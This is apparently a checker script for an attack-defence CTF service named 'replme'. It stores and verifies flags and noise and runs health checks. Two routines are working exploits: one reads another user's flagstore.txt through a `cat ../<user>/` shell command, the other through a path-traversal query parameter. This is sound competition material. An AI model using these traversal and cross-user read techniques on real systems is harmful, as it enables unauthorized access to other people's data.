import base64
import random
import re
import string
import traceback
from logging import LoggerAdapter

from enochecker3.chaindb import ChainDB
from enochecker3.enochecker import Enochecker
from enochecker3.types import (
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    MumbleException,
    OfflineException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import assert_equals
from httpx import AsyncClient
from websockets.exceptions import ConnectionClosedError, InvalidStatusCode

from exploit import exploit0_apply_delta
from noise import get_noise, get_noise1, get_random_noise, get_random_noise1
from util import (
    create_devenv,
    do_create_devenv,
    do_create_devenv_file,
    do_delete_devenv_file,
    do_get_devenv,
    do_get_devenv_file_content,
    do_get_devenv_files,
    do_patch_devenv,
    do_repl_auth,
    do_set_devenv_file_content,
    do_user_login,
    do_user_register,
    get_sessions,
    repl_create,
    repl_login,
    repl_websocket,
    sh,
    user_login,
    user_register,
)

checker = Enochecker("replme", 6969)


def app():
    return checker.app


@checker.putflag(0)
async def putflag0(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    try:
        (username, cookies, id) = await repl_create(client, db, logger)
        flag = base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8")
        await repl_websocket(
            task.address,
            logger,
            cookies,
            id,
            [sh(f'echo "{flag}" > flagstore.txt').default()],
        )
        return username
    except TimeoutError:
        raise MumbleException("Websocket timed out")
    except ConnectionClosedError:
        raise MumbleException("Connection was closed")
    except InvalidStatusCode:
        raise MumbleException("Invalid status code")
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Putflag failed")


@checker.getflag(0)
async def getflag0(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    try:
        (cookies, id) = await repl_login(client, db, logger)
        flag = (
            base64.b64encode(bytes(task.flag, "utf-8"))
            .decode("utf-8")
            .replace("+", "\\+")
        )
        await repl_websocket(
            task.address,
            logger,
            cookies,
            id,
            [sh("cat flagstore.txt").expect(f".*\n{flag}.*").errext()],
        )
    except TimeoutError:
        raise MumbleException("Flag was not found")
    except ConnectionClosedError:
        raise MumbleException("Connection was closed")
    except InvalidStatusCode:
        raise MumbleException("Invalid status code")
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Getflag failed")


@checker.exploit(0)
async def exploit0(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    try:
        target_username = task.attack_info

        if target_username is None:
            raise MumbleException("No attack_info")

        logger.info("Exploit: " + target_username)

        if len(target_username) != 60:
            raise MumbleException("Incorrect attack_info username length")

        delta_username = exploit0_apply_delta(target_username)

        logger.info("Delta username: " + delta_username)

        password = "deafbeefdeadbeefdeadbeef"

        (cookies, id) = await do_repl_auth(client, logger, delta_username, password)
        response = await repl_websocket(
            task.address,
            logger,
            cookies,
            id,
            [sh(f"echo FLAG && cat ../{target_username}/flagstore.txt").default()],
        )
        match = re.findall(r"FLAG\s*([A-Za-z0-9\+\=\/]+)\s*OK", response)
        if len(match) == 0:
            return None

        flag = base64.b64decode(match[0]).decode("utf-8")
        return flag
    except TimeoutError:
        raise MumbleException("Flag was not found")
    except ConnectionClosedError:
        raise MumbleException("Connection was closed")
    except InvalidStatusCode:
        raise MumbleException("Invalid status code")
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Exploit failed")


@checker.putnoise(0)
async def putnoise0(
    task: PutnoiseCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    try:
        (_, cookies, id) = await repl_create(client, db, logger)
        sessions = await get_sessions(client, cookies, logger)
        assert_equals(len(sessions) > 0, True, "No session created")

        (i, noise) = get_random_noise()
        await repl_websocket(
            task.address,
            logger,
            cookies,
            id,
            noise.command_chain,
        )
        await db.set("noise_id", i)
    except TimeoutError:
        raise MumbleException("Putnoise timed out")
    except ConnectionClosedError:
        raise MumbleException("Connection was closed")
    except InvalidStatusCode:
        raise MumbleException("Invalid status code")
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Putnoise failed")


@checker.getnoise(0)
async def getnoise0(
    task: GetnoiseCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    try:
        (cookies, id) = await repl_login(client, db, logger)
        sessions = await get_sessions(client, cookies, logger)
        assert_equals(len(sessions) > 0, True, "No session created")
        try:
            i = await db.get("noise_id")
        except KeyError:
            raise MumbleException("noise_id not present in chaindb")
        if not isinstance(i, int):
            raise MumbleException("noise_id is not a int: " + str(i))
        noise = get_noise(i)
        await repl_websocket(
            task.address,
            logger,
            cookies,
            id,
            noise.validation_chain,
        )
    except TimeoutError:
        raise MumbleException("Noise was not found")
    except ConnectionClosedError:
        raise MumbleException("Connection was closed")
    except InvalidStatusCode:
        raise MumbleException("Invalid status code")
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Getnoise failed")


@checker.havoc(0)
async def havoc0(
    client: AsyncClient,
    logger: LoggerAdapter,
):
    try:
        response = await client.get("/", follow_redirects=True)
        assert_equals(
            response.status_code < 300,
            True,
            "Failed to get index.html",
        )

        assert_equals(
            (await client.get("/icon.png", follow_redirects=True)).status_code < 300,
            True,
            "Failed to get icon.png",
        )

        pattern = r'[href|src]="(/[^"]*)"'
        matches = re.findall(pattern, response.text)
        for match in matches:
            if isinstance(match, str) and match.startswith("/_next/static"):
                assert_equals(
                    (await client.get(match, follow_redirects=True)).status_code < 300,
                    True,
                    "Failed to get " + match,
                )
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Havoc failed")


@checker.putflag(1)
async def putflag1(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    try:
        (username, password) = await user_register(client, logger, db)
        cookies = await do_user_login(client, logger, username, password)
        flag = base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8")
        devenvUuid = await create_devenv(
            client, logger, cookies, "cat flagstore.txt", "cat flagstore.txt"
        )
        await db.set("devenvUuid", devenvUuid)
        await do_set_devenv_file_content(
            client, logger, cookies, devenvUuid, "flagstore.txt", flag
        )

        return devenvUuid
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Putflag failed")


@checker.getflag(1)
async def getflag1(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    try:
        cookies = await user_login(client, logger, db)
        try:
            devenvUuid = await db.get("devenvUuid")
        except KeyError:
            raise MumbleException("Missing database entry from putflag")
        flag = (
            base64.b64encode(bytes(task.flag, "utf-8"))
            .decode("utf-8")
            .replace("+", "\\+")
        )

        payload = await do_get_devenv_file_content(
            client, logger, cookies, devenvUuid, "flagstore.txt"
        )

        match = re.match(f".*{flag}.*", payload, re.S)
        if match is None:
            raise MumbleException("Received unexpected input")
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Getflag failed")


@checker.exploit(1)
async def exploit1(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    try:
        target_devenvUuid = task.attack_info

        if target_devenvUuid is None:
            raise MumbleException("No attack_info")

        logger.info("Exploit: " + target_devenvUuid)

        username = "".join(random.choice(string.ascii_lowercase) for _ in range(35))
        password = "".join(random.choice(string.ascii_lowercase) for _ in range(35))
        name = "".join(random.choice(string.ascii_lowercase) for _ in range(10))

        await do_user_register(client, logger, username, password)
        cookies = await do_user_login(client, logger, username, password)
        devenvUuid = await do_create_devenv(
            client,
            logger,
            cookies,
            name,
            "echo FLAG",
            "cat flagstore.txt && echo OK",
        )

        payload = await do_get_devenv_file_content(
            client,
            logger,
            cookies,
            devenvUuid,
            "flagstore.txt",
            f"?uuid={devenvUuid}%2F..%2F{target_devenvUuid}",
        )
        flag = base64.b64decode(payload).decode("utf-8")
        return flag
    except AttributeError:
        raise MumbleException("Invalid base64")
    except TimeoutError:
        raise MumbleException("Flag was not found")
    except ConnectionClosedError:
        raise MumbleException("Connection was closed")
    except InvalidStatusCode:
        raise MumbleException("Invalid status code")
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Exploit failed")


@checker.putnoise(1)
async def putnoise1(
    task: PutnoiseCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    try:
        (username, password) = await user_register(client, logger, db)
        cookies = await do_user_login(client, logger, username, password)
        devenvUuid = await create_devenv(
            client, logger, cookies, "gcc -o main main.c", "./main"
        )
        (i, noise) = get_random_noise1()
        await db.set("devenvUuid", devenvUuid)
        await do_set_devenv_file_content(
            client, logger, cookies, devenvUuid, "main.c", noise
        )

        await db.set("noise_id", i)
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Putnoise failed")


@checker.getnoise(1)
async def getnoise1(
    task: GetnoiseCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
):
    try:
        cookies = await user_login(client, logger, db)
        try:
            devenvUuid = await db.get("devenvUuid")
        except KeyError:
            raise MumbleException("Missing database entry from putflag")
        try:
            i = await db.get("noise_id")
        except KeyError:
            raise MumbleException("noise_id not present in chaindb")
        if not isinstance(i, int):
            raise MumbleException("noise_id is not a int: " + str(i))
        noise = get_noise1(i)
        payload = await do_get_devenv_file_content(
            client,
            logger,
            cookies,
            devenvUuid,
            "main.c",
        )
        assert_equals(noise.strip(), payload.strip(), "Wrong file content")
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Getnoise failed")


@checker.havoc(1)
async def havoc1(
    client: AsyncClient,
    logger: LoggerAdapter,
):
    try:
        username = "".join(random.choice(string.ascii_lowercase) for _ in range(35))
        password = "".join(random.choice(string.ascii_lowercase) for _ in range(35))
        await do_user_register(client, logger, username, password)
        cookies = await do_user_login(client, logger, username, password)

        name = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
        buildCmd = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
        runCmd = "".join(random.choice(string.ascii_lowercase) for _ in range(10))

        devenvUuid = await do_create_devenv(
            client, logger, cookies, name, buildCmd, runCmd
        )
        devenv = await do_get_devenv(client, logger, cookies, devenvUuid)
        assert_equals(name, devenv["name"], "Devenv has invalid name")
        assert_equals(buildCmd, devenv["buildCmd"], "Devenv has invalid buildCmd")
        assert_equals(runCmd, devenv["runCmd"], "Devenv has invalid runCmd")

        name = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
        await do_patch_devenv(client, logger, cookies, devenvUuid, name=name)
        devenv = await do_get_devenv(client, logger, cookies, devenvUuid)
        assert_equals(name, devenv["name"], "After patch: Devenv has invalid name")

        filename = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
        await do_create_devenv_file(client, logger, cookies, devenvUuid, filename)
        files = await do_get_devenv_files(client, logger, cookies, devenvUuid)
        assert_equals(filename in files, True, "Create file did not create file")

        await do_delete_devenv_file(client, logger, cookies, devenvUuid, filename)
        files = await do_get_devenv_files(client, logger, cookies, devenvUuid)
        assert_equals(filename not in files, True, "Delete file did not delete file")
    except MumbleException as e:
        raise e
    except OfflineException as e:
        raise e
    except Exception:
        logger.error(traceback.format_exc())
        raise MumbleException("Havoc failed")


if __name__ == "__main__":
    checker.run()
